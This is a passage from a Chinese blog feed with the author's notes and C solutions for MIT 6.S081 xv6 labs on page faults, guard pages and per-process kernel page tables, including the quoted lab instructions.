<li><code>user stack</code>：user stack主要作为用户程序在<code>userspace</code>执行时需要的栈空间，当我们在用户空间执行用户的程序时，这时<code>sp</code>寄存器指向的就是<code>user stack</code>。</li>
<li><code>kernel stack</code>：<code>kernel stack</code>主要用户进程在系统调用时，切换到内核时执行内核的系统函数时，则这时<code>kernel space</code>执行时需要的栈空间，当系统调用发生时，则会发生<code>trap</code>，此时系统会切换<code>pc</code>到内核的函数调用，则此时我们执行内核函数时所需要的栈即为<code>kernel stack</code>。我们可以看到<code>kstack</code>之间有一个<code>guard page</code>.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line"><span class="comment">// map kernel stacks beneath the trampoline,</span></span><br><span class="line"><span class="comment">// each surrounded by invalid guard pages.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KSTACK(p) (TRAMPOLINE - ((p)+1)* 2*PGSIZE)</span></span><br></pre></td></tr></table></figure></li>
<li><code>stack</code>相邻的地方都有一个<code>guard page</code>，为了防止<code>stack</code>越界，访问<code>guard page</code>时就会报错。我们可以看到在<code>exec</code>函数执行时，代码和数据加装在完成后，会紧接着申请两个物理页，一个作为<code>guard page</code>,一个作为<code>stack</code>。当然方式比较奇怪：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line"><span class="comment">// Use the second as the user stack.</span></span><br><span class="line">sz = <span class="built_in">PGROUNDUP</span>(sz);</span><br><span class="line">uint64 sz1;</span><br><span class="line"><span class="comment">// malloc 2 page</span></span><br><span class="line"><span class="keyword">if</span>((sz1 = <span class="built_in">uvmalloc</span>(pagetable, sz, sz + <span class="number">2</span>*PGSIZE)) == <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">goto</span> bad;</span><br><span class="line">sz = sz1;</span><br><span class="line"><span class="comment">// 将第一个page标志位去掉</span></span><br><span class="line"><span class="built_in">uvmclear</span>(pagetable, sz<span class="number">-2</span>*PGSIZE);</span><br><span class="line">sp = sz;</span><br><span class="line">stackbase = sp - PGSIZE;</span><br></pre></td></tr></table></figure></li>
<li><code>Handle faults on the invalid page below the user stack.</code>我们只需要检测当前的<code>va</code>是否处在<code>guard page</code>中。我们知道<code>guard page</code>的地址范围为：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stackbase = <span class="built_in">PGROUNDDOWN</span>(p-&gt;trapframe-&gt;sp) \\</span><br><span class="line">stackbase - PGSIZE \le va \le stackbase</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// page fault, valid virtual address</span></span><br><span class="line">  	<span class="keyword">if</span>(pcode == <span class="number">15</span> || pcode == <span class="number">13</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(va &gt;= (stack<span class="number">-2</span>*PGSIZE) &amp;&amp; va &lt; (stack-PGSIZE))&#123;</span><br><span class="line">			p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(va &gt;= p-&gt;sz || va &gt; MAXVA)&#123;</span><br><span class="line">			p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="type">char</span> *mem = <span class="built_in">kalloc</span>();		</span><br><span class="line">	    <span class="keyword">if</span>(mem == <span class="number">0</span>)&#123;</span><br><span class="line">	        p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">	    &#125;</span><br><span class="line">		<span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">mappages</span>(p-&gt;pagetable,<span class="built_in">PGROUNDDOWN</span>(va),PGSIZE,(uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">kfree</span>(mem);</span><br><span class="line">			p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line">		p-&gt;trapframe-&gt;epc = epc;  </span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, <span class="built_in">r_scause</span>(), p-&gt;pid);</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, <span class="built_in">r_sepc</span>(), <span class="built_in">r_stval</span>());</span><br><span class="line">	    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>


<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab3 pagetable</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/63/</url>
    <content><![CDATA[<h1 id="page-tables"><a href="#page-tables" class="headerlink" title="page tables"></a>page tables</h1><p>最近工作太忙了，好久没有时间更新学习进度了，本周还是抽时间把<code>lab3</code>的内容作完了，<code>lab3</code>的难度感觉还是非常大的，不过最终把<code>lab3</code>完成后，就对虚拟内存管理有了深刻的认识。对于<code>vm</code>的那几个函数看了很多遍。调试了很多遍,终于发现问题,然后解决该问题了.<br><img src="https://i.loli.net/2021/08/10/FdEK8BPfDReA5kX.png"></p>
<h2 id="page"><a href="#page" class="headerlink" title="page"></a>page</h2><p>在<code>xv6</code>系统中，物理内存都被分成了<code>4096</code>byte的页，比如物理地址也分为两部分即物理页码(44bit)和页内偏移地址(12bit)<code>offset</code>。由下图我们可以看到虚拟地址到物理地址的映射。<br><img src="https://i.loli.net/2021/08/07/BxHCM9VbyEvnrqz.png"><br>但在<code>xv6</code>系统中虚拟地址实际只用到64位中的低39位，高位的25位并没有用到，因此我们可以知道虚拟页总共有$2^{27}$页，我们假如直接进行地址的话，则可以发现每个页表的大小可能都为$2^{27}$,这对内存来说不可取，实际上我们采用分段式的页表映射。页表中的每一项每一项实际存储的虚拟地址印刷的物理页的索引号。在<code>xv6</code>系统中页表采用三级页表的形式的存储，每一级页表的大小实际刚好为一页物理页的大小，因此每一级页表刚好可以存储存储$2^{9}$项。<br><img src="https://i.loli.net/2021/08/09/PCe5ldv2pAUYZoa.png"></p>
<ul>
<li>我们通过下图可以看到一个虚拟地址实际包含5部分，保留位为25位，紧接着为9位的一级页表内的的<code>offset</code>，紧接着为9位的二级页表内的的<code>offset</code>，紧接着为9位的三级页表内的的<code>offset</code>，三级页表中则存储的为该虚拟地址对应的实际物理页编号，我们取出物理页编号，再加上<code>offset</code>即可得到实际的物理地址。<br><img src="https://i.loli.net/2021/08/07/O6GLjEMNrFSfb9w.png"><br>我们可以看到代码中几个比较重要的宏定义<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每一个物理页的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSIZE 4096 <span class="comment">// bytes per page</span></span></span><br><span class="line"><span class="comment">// 物理页的offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSHIFT 12  <span class="comment">// bits of offset within a page</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDUP(sz)  (((sz)+PGSIZE-1) &amp; ~(PGSIZE-1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span></span><br><span class="line"><span class="comment">// shift a physical address to the right place for a PTE.</span></span><br><span class="line"><span class="comment">//取出物理地址转换为对应的页表项</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)</span></span><br><span class="line"><span class="comment">//通过页表得到对应的物理页对应的编号</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)</span></span><br><span class="line"><span class="comment">// 取出页表项中对应的标志位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_FLAGS(pte) ((pte) &amp; 0x3FF)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// extract the three 9-bit page table indices from a virtual address.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PXMASK          0x1FF <span class="comment">// 9 bits</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PXSHIFT(level)  (PGSHIFT+(9*(level)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PX(level, va) ((((uint64) (va)) &gt;&gt; PXSHIFT(level)) &amp; PXMASK)</span></span><br></pre></td></tr></table></figure></li>
<li>三级页表中同时存储的有<code>flags</code>,<code>flags</code>代表该页表是否有效,我们需要判断每一页的访问权，只需要判断标志位即可。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="comment">// valid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_R (1L &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_W (1L &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_X (1L &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_U (1L <span class="string">&lt;&lt; 4) // 1 -&gt;</span> user can access</span></span><br></pre></td></tr></table></figure>
我们通过虚拟地址的12~39位，实际为该虚拟地址的三级页表的偏移地址，通过三级页表的偏移地址，最终可以得到该虚拟地址对应的物理页号。</li>
</ul>
<h3 id="1-Print-a-page-table"><a href="#1-Print-a-page-table" class="headerlink" title="1. Print a page table"></a>1. Print a page table</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">To help you learn about RISC-V page tables, and perhaps to aid future debugging, your first task is to write a function that prints the contents of a page table.</span><br><span class="line"></span><br><span class="line">Define a function called vmprint(). It should take a pagetable_t argument, and print that pagetable in the format described below. Insert if(p-&gt;pid==1) vmprint(p-&gt;pagetable) in exec.c just before the return argc, to print the first process&#x27;s page table. You receive full credit for this assignment if you pass the pte printout test of make grade.</span><br></pre></td></tr></table></figure>
<p>这部分比较简单，打印出页表的内容，我们知道三级页表的原理，这个即为简单的<code>dfs</code>遍历即可，遍历三级页表中的内容，每一级页表有<code>512</code>项，每一级页表有标志位，判断标志位是否有效，即是否包含PTE_V，则表示该页表有效。如果有效则向下遍历即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pteprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable,<span class="type">int</span> level)</span></span>&#123;  </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; ++i)&#123;</span><br><span class="line">    <span class="type">pte_t</span> *pte = &amp;pagetable[i];</span><br><span class="line">    <span class="comment">// level page table entry</span></span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">      <span class="comment">// page table is valid</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">2</span>; j &gt; level; --j)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;.. &quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;..%d: pte %p pa %p\n\r&quot;</span>,i,*pte,(<span class="type">pagetable_t</span>)<span class="built_in">PTE2PA</span>(*pte));</span><br><span class="line">      <span class="keyword">if</span>(level &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">         <span class="built_in">pteprint</span>((<span class="type">pagetable_t</span>)<span class="built_in">PTE2PA</span>(*pte),level<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-A-kernel-page-table-per-process"><a href="#2-A-kernel-page-table-per-process" class="headerlink" title="2.A kernel page table per process"></a>2.A kernel page table per process</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xv6 has a single kernel page table that&#x27;s used whenever it executes in the kernel. The kernel page table is a direct mapping to physical addresses, so that kernel virtual address x maps to physical address x. Xv6 also has a separate page table for each process&#x27;s user address space, containing only mappings for that process&#x27;s user memory, starting at virtual address zero. Because the kernel page table doesn&#x27;t contain these mappings, user addresses are not valid in the kernel. Thus, when the kernel needs to use a user pointer passed in a system call (e.g., the buffer pointer passed to write()), the kernel must first translate the pointer to a physical address. The goal of this section and the next is to allow the kernel to directly dereference user pointers.</span><br><span class="line"></span><br><span class="line">Your first job is to modify the kernel so that every process uses its own copy of the kernel page table when executing in the kernel. Modify struct proc to maintain a kernel page table for each process, and modify the scheduler to switch kernel page tables when switching processes. For this step, each per-process kernel page table should be identical to the existing global kernel page table. You pass this part of the lab if usertests runs correctly.</span><br></pre></td></tr></table></figure>
<ul>
<li>题目本质是说进行内核空间的虚拟地址和用户空间的虚拟地址因为不在同一个页表里，所以内核的地址空间和用户的地址无法正常进行访问，必须要通过转换，特别在内核态访问用户态传过来的地址时，无法直接访问，需要通过转换才可以，因此我们需要在内核态将用户态的虚拟地址空间也需要做映射，这样我们就可以在内核态直接访问用户态的地址。</li>
<li>在此时，我们需要重新为进行申请一个内核态的页表，每个进程则有一个独立的内核页表，并将访问系统的所有的特殊的接口地址全部映射到该页表中，同时将该进程的内核栈也映射到该页表。每个进程都有一个独立的内核栈，由于内核栈空间与用户空间的地址映射在同一个地址表中，因此可以直接访问。</li>
</ul>
<ol>
<li>为进程建立一个内核页表，并做好地址映射。新建页表，并做好内核地址的映射。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">pagetable_t</span></span></span><br><span class="line"><span class="function"><span class="title">prockvminit</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">pagetable_t</span> pagetable = (<span class="type">pagetable_t</span>) <span class="built_in">kalloc</span>();</span><br><span class="line">	<span class="keyword">if</span>(pagetable == <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// each page size is 4096 byte = 4KB</span></span><br><span class="line">	<span class="comment">// kernel page table</span></span><br><span class="line">	<span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// uart registers</span></span><br><span class="line">	<span class="comment">// uart mmmap</span></span><br><span class="line">	<span class="built_in">prockvmmap</span>(pagetable,UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// virtio mmio disk interface</span></span><br><span class="line">	<span class="built_in">prockvmmap</span>(pagetable,VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// CLINT</span></span><br><span class="line">	<span class="comment">//prockvmmap(pagetable,CLINT, CLINT, 0x10000, PTE_R | PTE_W);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// PLIC</span></span><br><span class="line">	<span class="built_in">prockvmmap</span>(pagetable,PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">	<span class="built_in">prockvmmap</span>(pagetable,KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">	<span class="built_in">prockvmmap</span>(pagetable,(uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">	<span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">	<span class="built_in">prockvmmap</span>(pagetable,TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pagetable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">prockvmmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable,uint64 va, uint64 pa, uint64 sz, <span class="type">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">mappages</span>(pagetable, va, sz, pa, perm) != <span class="number">0</span>)&#123;</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;total free = %d \n\r&quot;</span>,<span class="built_in">totalfree</span>());</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;va = %p sz = %p \n\r&quot;</span>,va,sz);</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;prockvmmap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>在进程初始化时，我们可以保持不变，初始化时即为每个进程分配内核栈，映射到全局的<code>kernel_table</code>中,我们在进行进程<code>alloc</code>时，可以将该内核栈物理页再做一遍映射，映射到进程的内核表中。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">procinit</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">initlock</span>(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      <span class="built_in">initlock</span>(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line">	  p-&gt;kallocstats = <span class="number">0</span>;</span><br><span class="line">  	  p-&gt;kfreestats = <span class="number">0</span>;</span><br><span class="line">	  <span class="comment">// map kernel stack to the kernel page table</span></span><br><span class="line">	  <span class="type">char</span> *pa = <span class="built_in">kalloc</span>();</span><br><span class="line">	  <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">	  uint64 va = <span class="built_in">KSTACK</span>((<span class="type">int</span>) (p - proc));</span><br><span class="line">	  <span class="built_in">kvmmap</span>(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">	  p-&gt;kstack = va;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">kvminithart</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// map kernel stack to the kernel page table</span></span><br><span class="line"> p-&gt;kpagetable = <span class="built_in">prockvminit</span>();</span><br><span class="line"> <span class="built_in">prockvmmap</span>(p-&gt;kpagetable,p-&gt;kstack,<span class="built_in">kvmpa</span>(p-&gt;kstack),PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Allocate a trapframe page.</span></span><br><span class="line"> <span class="keyword">if</span>((p-&gt;trapframe = (<span class="keyword">struct</span> trapframe *)<span class="built_in">kalloc</span>()) == <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// An empty user page table.</span></span><br><span class="line"> p-&gt;pagetable = <span class="built_in">proc_pagetable</span>(p);</span><br><span class="line"> <span class="keyword">if</span>(p-&gt;pagetable == <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="built_in">freeproc</span>(p);</span><br><span class="line">   <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>进程释放时，也需要对该进程的内核页表进行释放,但是释放时由于内核空间只是做了物理页的映射，因此我们只需要释放页表的空间即可，不需要释放物理页的空间。但在代码中加入了对每个进程执行<code>kalloc</code>和<code>kfree</code>的次数统计,发现实际确实存在内存泄漏,申请的物理页没有被释放的问题.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// release trap frame</span></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;trapframe)</span><br><span class="line">    <span class="built_in">kfree</span>((<span class="type">void</span>*)p-&gt;trapframe);</span><br><span class="line">  p-&gt;trapframe = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//release user page table</span></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pagetable)</span><br><span class="line">    <span class="built_in">proc_freepagetable</span>(p-&gt;pagetable, p-&gt;sz);</span><br><span class="line">  p-&gt;pagetable = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//release kernel page table and kernel stack</span></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;kpagetable) &#123; </span><br><span class="line">  	<span class="built_in">procfreekpt</span>(p-&gt;kpagetable);</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;kpagetable = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
<li>我们用一个遍历即可，但是总感觉这个函数写的有点问题，没有释放所有的物理页，存在内存泄漏的问题，这个问题查找了很长时间没有解决。从github上下载了几个代码运行了一下，发现也都有问题。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Recursively free page-table pages except leaf</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">procfreekpt</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span>&#123;</span><br><span class="line">  <span class="comment">// there are 2^9 = 512 PTEs in a page table.</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)&#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(pte &amp; (PTE_R|PTE_W|PTE_X)) &#123;</span><br><span class="line">	  uint64 child = <span class="built_in">PTE2PA</span>(pte);</span><br><span class="line">	  <span class="built_in">procfreekpt</span>((<span class="type">pagetable_t</span>)child);</span><br><span class="line">	  pagetable[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">kfree</span>((<span class="type">void</span>*)pagetable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>进程调度时,当前进程如果被调度时,则此时我们需要将该进行的内核页表的地址加载到页表的寄存器中,此时我们访问地址进行转换时,则通过该页表查找物理页的地址.我们可以看到在完成上下文切换前,将页表加载完成即可.当前如果所有的进程都空闲时,则我们将全局的<code>kernel pagetable</code>进行加载.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">       p-&gt;state = RUNNING;</span><br><span class="line">       c-&gt;proc = p;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// load kernel pagetable address into page table</span></span><br><span class="line">    <span class="built_in">prockvminithart</span>(p-&gt;kpagetable);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// load process kernel page table</span></span><br><span class="line">       <span class="built_in">swtch</span>(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Process is done running for now.</span></span><br><span class="line">       <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">       c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// found</span></span><br><span class="line">       found = <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// the current has no process runing</span></span><br><span class="line">   <span class="keyword">if</span>(found == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// use kernel pagetable when no process runing</span></span><br><span class="line">  <span class="built_in">kvminithart</span>();</span><br><span class="line">  </span><br><span class="line">     <span class="built_in">intr_on</span>();</span><br><span class="line">  <span class="comment">// load kernel page table</span></span><br><span class="line">     <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span></span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-copyin-x2F-copyinstr"><a href="#3-copyin-x2F-copyinstr" class="headerlink" title="3.copyin&#x2F;copyinstr"></a>3.copyin&#x2F;copyinstr</h3><ul>
<li>需要自己重新写<code>copyin</code>和<code>copyinstr</code>的代码，这个其实比较简单，在上一个练习中我们将内核中的所有的地址全部挂接到内核表中，在这个练习中我们需要将所有的用户空间的地址要全部映射到内核的页表中，这样在进程运行时，内核即可进行对用户空间的虚拟地址进行访问.我们可以重写一个函数对页表的物理页进行映射.下面函数的作用即是将一个页表中的虚地址全部映射到一个页表中.实际只做了物理页的映射,而并有实际的物理页的申请.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">procuvmcopy</span><span class="params">(<span class="type">pagetable_t</span> uvm,<span class="type">pagetable_t</span> kvm,uint64 old_sz, uint64 new_sz)</span></span>&#123;</span><br><span class="line">	<span class="type">pte_t</span> *pte;</span><br><span class="line">	uint64 pa, i;</span><br><span class="line">	uint flags;</span><br><span class="line">	</span><br><span class="line">	old_sz = <span class="built_in">PGROUNDUP</span>(old_sz);</span><br><span class="line">	<span class="keyword">if</span> (new_sz &lt;= old_sz) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = old_sz; i &lt; new_sz; i += PGSIZE)&#123;</span><br><span class="line">		<span class="keyword">if</span>((pte = <span class="built_in">walk</span>(uvm, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">panic</span>(<span class="string">&quot;procuvmcopy: pte should exist&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">panic</span>(<span class="string">&quot;procuvmcopy: page not present&quot;</span>);</span><br><span class="line">		pa = <span class="built_in">PTE2PA</span>(*pte);</span><br><span class="line">		flags = <span class="built_in">PTE_FLAGS</span>(*pte);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">mappages</span>(kvm, i, PGSIZE, pa, flags&amp;(~PTE_U)) != <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">panic</span>(<span class="string">&quot;procuvmcopy: remap&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">	<span class="built_in">uvmunmap</span>(kvm, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>我们仔细阅读提示,发现有几个函数需要进行此类操作和映射.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Replace <span class="title">copyin</span><span class="params">()</span> with a call to copyin_new first, <span class="keyword">and</span> make it work, before moving on to copyinstr.</span></span><br><span class="line"><span class="function">At each point where the kernel changes a process&#x27;s user mappings, change the process&#x27;s kernel page table in the same way. Such points include <span class="title">fork</span><span class="params">()</span>, <span class="title">exec</span><span class="params">()</span>, <span class="keyword">and</span> <span class="title">sbrk</span><span class="params">()</span>.</span></span><br><span class="line"><span class="function">Don&#x27;t forget that to include the first process&#x27;s user page table in its kernel page table in userinit.</span></span><br><span class="line"><span class="function">What permissions <span class="keyword">do</span> the PTEs <span class="keyword">for</span> user addresses need in a process&#x27;s kernel page table? <span class="params">(A page with PTE_U set cannot be accessed in kernel mode.)</span></span></span><br><span class="line"><span class="function">Don&#x27;t forget about the above-mentioned PLIC limit.</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
